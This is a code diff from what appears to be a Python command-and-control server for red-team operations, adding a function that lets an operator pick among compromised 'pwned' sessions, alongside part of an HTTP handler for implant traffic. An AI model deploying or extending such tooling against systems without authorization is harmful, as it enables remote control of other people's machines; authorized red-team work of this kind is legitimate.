@@ -6,6 +6,39 @@ from urllib.parse import unquote_plus
 from inputimeout import inputimeout, TimeoutOccurred
 from settings import CWD_RESPONSE, PORT, CMD_REQUEST, INPUT_TIMEOUT, KEEP_ALIVE_CMD, RESPONSE, RESPONSE_KEY, BIND_ADDR
 
+def get_new_session():
+    """ Function to check if other sessions exist. If none do, re-initialize variables. However, if session do
+    exist, allow the red team operator to pick one to become a new active session. """
+
+    # These variables must be global as they will often be updated via multiple sessions
+    global active_session, pwned_dict, pwned_id
+
+    # Remove the dictionary entry for the current active session
+    del pwned_dict[active_session]
+
+    # If dictionary is empty, re-initialize variables to their starting values
+    if not pwned_dict:
+        print("Waiting for new connections.\n")
+    else:
+        # Display sessions in our dictionary and choose one of them to switch over to
+        while True:
+            print(*pwned_dict.items(), sep="\n")
+            try:
+                new_session = int(input("\nChoose a session number to make active: "))
+            except ValueError:
+                print("\nYou must choose a pwned id of one of the sessions shown on the screen\n")
+                continue
+
+            # Ensure we enter a pwned_id that is in our pwned_dict and set active_session to it
+            if new_session in pwned_dict:
+                active_session = new_session
+                print(f"\nActive session is now: {pwned_dict[active_session]}")
+                break
+
+            else:
+                print("You must choose a pwned id of one of the sessions shown on the screen.\n")
+                continue
+
 class C2Handler(BaseHTTPRequestHandler):
     """This is a child class of the BaseHTTPRequestHandler class.
     It handles all HTTP requests that arrive at the c2 server."""
